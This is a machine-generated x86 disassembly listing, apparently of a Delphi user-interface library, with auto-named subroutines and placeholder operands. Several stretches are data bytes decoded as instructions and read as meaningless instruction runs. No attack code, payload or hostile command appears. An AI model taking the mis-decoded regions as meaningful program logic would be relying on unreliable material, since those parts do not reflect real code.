add [ edi + ebx + 0x41 ] cl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax ] al
add al [ eax ]
out dx al
jl r-xdata
inc ebx
jne r-xdata
je r-xdata
add al bl
mov [ 0xffffffff8d480041 ] eax
inc esp
add [ eax + ebx * 4 - 0x5e4bffbc ] ah
inc ecx
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp al 0x20
inc ecx
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
inc ecx
add [ esi + ebx * 4 - 0x616bffbf ] bl
inc ecx
add [ ecx - 0x6ccbffbf ] bh
inc esp
add [ eax + 0x3c0041a4 ] bl
movsb [ edi ] [ esi ]
inc ecx
add al dl
mov [ 0xffffffffa4000041 ] eax
inc ecx
add ah dl
mov [ 0xffffffff8e9c0041 ] eax
inc esp
add ah cl
xchg esi eax
inc esp
add [ esi + edx * 4 + 0x44 ] ah
add [ eax + 0xe004499 ] ah
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
js r-xdata
mov ah 0xa1
imul esi [ ebx + 0x74 ] 0x8b4c0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1bffbb75 ] ah
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl al
mov eax [ eax + eax - 0x30 ]
mov eax [ eax + eax - 0x60 ]
add [ eax ] al
add ah ah
xchg [ eax + eax - 0x64 ] eax
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
test al 0x34
inc eax
add al dh
xor [ eax ] eax
or al 0x32
dec esp
sub_448bc6
out dx eax
push eax
cwde
inc esp
add [ eax ] bl
cdq
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add al dh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
in al 0x8b
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a378
test bl bl
jle r-xdata
mov edx esi
call sub_4490ec
add [ ebx ] bl
inc ecx
add al dh
mov [ 0xffffffffa3200041 ] al
inc ecx
add [ eax - 0x5e ] al
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
inc ecx
add [ edx + edx * 4 ] bh
inc esp
add [ eax - 0x6e ] dl
inc esp
add [ edx + edx * 4 + 0x44 ] ah
add [ eax - 0x6e ] bh
inc esp
add [ edx + edx * 4 - 0x6d5fffbc ] cl
inc esp
add [ edx + edx * 4 - 0x6d37ffbc ] dh
inc esp
add ah bl
xchg edx eax
inc esp
add al dh
xchg edx eax
inc esp
add [ ebx + edx * 4 ] al
inc esp
add [ eax ] cl
xchg ebx eax
inc esp
add [ ebx + edx * 4 ] cl
inc esp
add [ eax ] dl
xchg ebx eax
inc esp
add [ ebx + edx * 4 ] dl
inc esp
add [ eax ] bl
xchg ebx eax
inc esp
add [ ebx + edx * 4 ] bl
inc esp
add [ eax ] ah
xchg ebx eax
inc esp
add [ ebx + edx * 4 ] ah
inc esp
add [ eax ] ch
xchg ebx eax
inc esp
add [ ebx + edx * 4 ] ch
inc esp
add [ eax ] dh
xchg ebx eax
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5e85653
test eax 0xda8bfffb
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x7bffbe5e ] cl
mov [ 0xffffffffa2bc0041 ] al
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
mov eax [ eax + eax - 0x48 ]
mov [ eax + eax + 0x3 ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x8c540000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
mov [ eax + eax + 0x18 ] es
add [ eax ] al
add [ eax + 0x29 ] dh
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_448cd8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a378
test bl bl
jle r-xdata
mov edx esi
call sub_4490ec
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_448d48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419e8c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_448df0
sub_448d7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448d0c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413e34
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_413fc0
sub_448dc4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043b4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ffc
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_448df0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4490ec
mov edx ebx
mov eax esi
call sub_4490cc
sub_448e18
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_448df0
sub_448e44
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45dedc
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403454
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a404
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_439e08
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448e9c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45df04
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403454
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a420
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_439e08
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448ef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_449078
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_448f60
push ebx
push esi
push edi
call sub_4035e4
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403258
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_41402c
call sub_403258
mov eax [ edi + 0x30 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a78
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
sub_448fb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_448ff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413fa0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov edx edi
call sub_448d7c
sub_449044
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44ad00
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44ad44
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419afc
sub_449084
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d48
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4490ec
sub_4490cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413de8
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419afc
pop esi
pop ebx
retn
sub_4490ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_414088
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_449108
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_449170
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_453db4
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_44c59c
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_449978
mov edx ebp
call sub_4499d8
inc eax
je r-xdata
sub_4491fc
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_44921c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_449334
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a334
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_449388
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403258
mov eax [ esi + 0x9c ]
call sub_403258
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448cd8
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d250
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4493d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4145e4
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_449484
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4494e4
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4495ec
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_449724
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_449784
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4497e0
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_449844
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_449484
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4043b4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ffc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4494e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_4495dc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44903c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_449028
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4494e4
sub_4495ec
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_449664
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4043b4
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ffc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413f44
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413f44
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_4496cc
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_449724
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4043b4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ffc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_449784
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4497e0
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_449844
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_413f44
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403408
test eax eax
je r-xdata
sub_4498a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4043b4
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419f84
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_449484
sub_4498f0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_449918
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_448e44
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4494e4
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_4499ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4155a4
mov edi eax
mov eax esi
call sub_44c888
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4499d8
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_449a1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_449a41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449a48
retn
sub_449a7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ebx [ edx - 0x6533ffbc ]
inc esp
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x10044b5 ] dl
add bh bh
inc esp
mov ch 0x44
add [ ebx ] cl
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
enter 0x449b 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x9c
popad
dec ecx
outsb
js r-xdata
inc esp
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al bl
0x64070044 0x4673
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
mov eax 0x20000000
retn
je r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 ] cl
inc esp
add [ esp + ebx * 4 ] dl
inc esp
add [ eax ] ch
add [ eax ] al
adc [ eax ] ch
inc ecx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
test al 0x34
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x2c00408d
pushfd
inc esp
add [ edi ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
pushfd
popad
jb r-xdata
ror [ ebx - 0x282173a ] cl
cld
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
